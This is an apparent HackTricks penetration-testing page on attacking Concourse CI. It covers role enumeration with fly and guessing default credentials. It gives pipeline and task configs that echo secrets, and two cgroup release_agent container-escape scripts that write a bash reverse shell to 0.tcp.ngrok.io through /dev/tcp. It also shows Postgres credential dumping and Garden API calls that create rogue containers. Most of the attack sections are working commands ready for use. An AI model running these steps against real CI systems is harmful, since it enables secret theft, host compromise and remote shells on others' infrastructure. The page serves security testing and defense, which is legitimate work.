# Concourse Enumeration & Attacks

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>

## User Roles & Permissions

Concourse comes with five roles:

* _Concourse_ **Admin**: This role is only given to owners of the **main team** (default initial concourse team). Admins can **configure other teams** (e.g.: `fly set-team`, `fly destroy-team`...). The permissions of this role cannot be affected by RBAC.
* **owner**: Team owners can **modify everything within the team**.
* **member**: Team members can **read and write** within the **teams assets** but cannot modify the team settings.
* **pipeline-operator**: Pipeline operators can perform **pipeline operations** such as triggering builds and pinning resources, however they cannot update pipeline configurations.
* **viewer**: Team viewers have **"read-only" access to a team** and its pipelines.

{% hint style="info" %}
Moreover, the **permissions of the roles owner, member, pipeline-operator and viewer can be modified** configuring RBAC (configuring more specifically it's actions). Read more about it in: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Note that Concourse **groups pipelines inside Teams**. Therefore users belonging to a Team will be able to manage those pipelines and **several Teams** might exist. A user can belong to several Teams and have different permissions inside each of them.

## Vars & Credential Manager

In the YAML configs you can configure values using the syntax `((`_`source-name`_`:`_`secret-path`_`.`_`secret-field`_`))`.\
The **source-name is optional**, and if omitted, the [cluster-wide credential manager](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) will be used, or the value may be provided [statically](https://concourse-ci.org/vars.html#static-vars).\
The **optional \_secret-field**\_ specifies a field on the fetched secret to read. If omitted, the credential manager may choose to read a 'default field' from the fetched credential if the field exists.\
Moreover, the _**secret-path**_ and _**secret-field**_ may be surrounded by double quotes `"..."` if they **contain special characters** like `.` and `:`. For instance, `((source:"my.secret"."field:1"))` will set the _secret-path_ to `my.secret` and the _secret-field_ to `field:1`.

### Static Vars

Static vars can be specified in **tasks steps**:

```yaml
  - task: unit-1.13
    file: booklit/ci/unit.yml
    vars: {tag: 1.13}
```

Or using the following `fly` **arguments**:

* `-v` or `--var` `NAME=VALUE` sets the string `VALUE` as the value for the var `NAME`.
* `-y` or `--yaml-var` `NAME=VALUE` parses `VALUE` as YAML and sets it as the value for the var `NAME`.
* `-i` or `--instance-var` `NAME=VALUE` parses `VALUE` as YAML and sets it as the value for the instance var `NAME`. See [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) to learn more about instance vars.
* `-l` or `--load-vars-from` `FILE` loads `FILE`, a YAML document containing mapping var names to values, and sets them all.

### Credential Management

There are different ways a **Credential Manager can be specified** in a pipeline, read how in [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
Moreover, Concourse supports different credential managers:

* [The Vault credential manager](https://concourse-ci.org/vault-credential-manager.html)
* [The CredHub credential manager](https://concourse-ci.org/credhub-credential-manager.html)
* [The AWS SSM credential manager](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [The AWS Secrets Manager credential manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Kubernetes Credential Manager](https://concourse-ci.org/kubernetes-credential-manager.html)
* [The Conjur credential manager](https://concourse-ci.org/conjur-credential-manager.html)
* [Caching credentials](https://concourse-ci.org/creds-caching.html)
* [Redacting credentials](https://concourse-ci.org/creds-redacting.html)
* [Retrying failed fetches](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Note that if you have some kind of **write access to Concourse** you can create jobs to **exfiltrate those secrets** as Concourse needs to be able to access them.
{% endhint %}

## Concourse Enumeration

In order to enumerate a concourse environment you first need to **gather valid credentials** or to find an **authenticated token** probably in a `.flyrc` config file.

### Login and Current User enum

* To login you need to know the **endpoint**, the **team name** (default is `main`) and a **team the user belongs to**:
  * `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
* Get configured **targets**:
  * `fly targets`
* Get if the configured **target connection** is still **valid**:
  * `fly -t <target> status`
* Get **role** of the user against the indicated target:
  * `fly -t <target> userinfo`

### Teams & Users

* Get a list of the Teams
  * `fly -t <target> teams`
* Get roles inside team
  * `fly -t <target> get-team -n <team-name>`
* Get a list of users
  * `fly -t <target> active-users`

### Pipelines

* **List** pipelines:
  * `fly -t <target> pipelines -a`
* **Get** pipeline yaml (**sensitive information** might be found in the definition):
  * `fly -t <target> get-pipeline -p <pipeline-name>`
* Get all pipeline **config declared vars**
  * `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* Get all the **pipelines secret names used** (if you can create/modify a job or hijack a container you could exfiltrate them):

```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do 
    echo $pipename;
    fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
    echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```

### Containers & Workers

* List **workers**:
  * `fly -t <target> workers`
* List **containers**:
  * `fly -t <target> containers`
* List **builds** (to see what is running):
  * `fly -t <target> builds`

## Concourse Attacks

### Credentials Brute-Force

* admin:admin
* test:test

### Secrets and params enumeration

In the previous section we saw how you can **get all the secrets names and vars** used by the pipeline. The **vars might contain sensitive info** and the name of the **secrets will be useful later to try to steal** them.

### Session inside running or recently run container

If you have enough privileges (**member role or more**) you will be able to **list pipelines and roles** and just get a **session inside** the `<pipeline>/<job>` **container** using:

```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```

With these permissions you might be able to:

* **Steal the secrets** inside the **container**
* Try to **escape** to the node
* Enumerate/Abuse **cloud metadata** endpoint (from the pod and from the node, if possible)

### Pipeline Creation/Modification

If you have enough privileges (**member role or more**) you will be able to **create/modify new pipelines.** Check this example:

```yaml
jobs:
- name: simple
  plan:
  - task: simple-task
    privileged: true
    config:
      # Tells Concourse which type of worker this task should run on
      platform: linux
      image_resource:
        type: registry-image
        source:
          repository: busybox # images are pulled from docker hub by default
      run:
        path: sh
        args:
        - -cx
        - |
          echo "$SUPER_SECRET"
          sleep 1000
      params:
        SUPER_SECRET: ((super.secret))
```

With the **modification/creation** of a new pipeline you will be able to:

* **Steal** the **secrets** (via echoing them out or getting inside the container and running `env`)
* **Escape** to the **node** (by giving you enough privileges - `privileged: true`)
* Enumerate/Abuse **cloud metadata** endpoint (from the pod and from the node)
* **Delete** created pipeline

### Execute Custom Task

This is similar to the previous method but instead of modifying/creating a whole new pipeline you can **just execute a custom task** (which will probably be much more **stealthier**):

```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
  type: registry-image
  source:
    repository: ubuntu
run:
  path: sh
  args:
  - -cx
  - |
    env
    sleep 1000
params:
  SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```

### Escaping to the node from privileged task

In the previous sections we saw how to **execute a privileged task with concourse**. This won't give the container exactly the same access as the privileged flag in a docker container. For example, you won't see the node filesystem device in /dev, so the escape could be more "complex".

In the following PoC we are going to use the release\_agent to escape with some small modifications:

```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

# The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

# Then next part I think is constant "hostpath-provisioner/default/"

# For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

# The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```

{% hint style="warning" %}
As you might have noticed this is just a [**regular release\_agent escape**](../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#privileged) just modifying the path of the cmd in the node
{% endhint %}

### Escaping to the node from a Worker container

A regular release\_agent escape with a minor modification is enough for this:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```

### Escaping to the node from the Web container

Even if the web container has some defenses disabled it's **not running as a common privileged container** (for example, you **cannot** **mount** and the **capabilities** are very **limited**, so all the easy ways to escape from the container are useless).

However, it stores **local credentials in clear text**:

```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```

You cloud use that credentials to **login against the web server** and **create a privileged container and escape to the node**.

In the environment you can also find information to **access the postgresql** instance that concourse uses (address, **username**, **password** and database among other info):

```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```

### Abusing Garden Service - Not a real Attack

{% hint style="warning" %}
This are just some interesting notes about the service, but because it's only listening on localhost, this notes won't present any impact we haven't already exploited before
{% endhint %}

By default each concourse worker will be running a [**Garden**](https://github.com/cloudfoundry/garden) service in port 7777. This service is used by the Web master to indicate the worker **what he needs to execute** (download the image and run each task). This sound pretty good for an attacker, but there are some nice protections:

* It's just **exposed locally** (127..0.0.1) and I think when the worker authenticates agains the Web with the special SSH service, a tunnel is created so the web server can **talk to each Garden service** inside each worker.
* The web server is **monitoring the running containers every few seconds**, and **unexpected** containers are **deleted**. So if you want to **run a custom container** you need to **tamper** with the **communication** between the web server and the garden service.

Concourse workers run with high container privileges:

```
Container Runtime: docker
Has Namespaces:
	pid: true
	user: false
AppArmor Profile: kernel
Capabilities:
	BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```

However, techniques like **mounting** the /dev device of the node or release\_agent **won't work** (as the real device with the filesystem of the node isn't accesible, only a virtual one). We cannot access processes of the node, so escaping from the node without kernel exploits get complicated.

{% hint style="info" %}
In the previous section we saw how to escape from a privileged container, so if we can **execute** commands in a **privileged container** created by the **current** **worker**, we could **escape to the node**.
{% endhint %}

Note that playing with concourse I noted that when a new container is spawned to run something, the container processes are accessible from the worker container, so it's like a container creating a new container inside of it.

#### Getting inside a running privileged container

```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
# In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
  --header='Content-Type:application/json' \
  'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
  
# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```

#### Creating a new privileged container

You can very easily create a new container (just run a random UID) and execute something on it:

```bash
curl -X POST http://127.0.0.1:7777/containers \
   -H 'Content-Type: application/json' \
   -d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
  --header='Content-Type:application/json' \
  'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```

However, the web server is checking every few seconds the containers that are running, and if an unexpected one is discovered, it will be deleted. As the communication is occurring in HTTP, you could tamper the communication to avoid the deletion of unexpected containers:

```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>
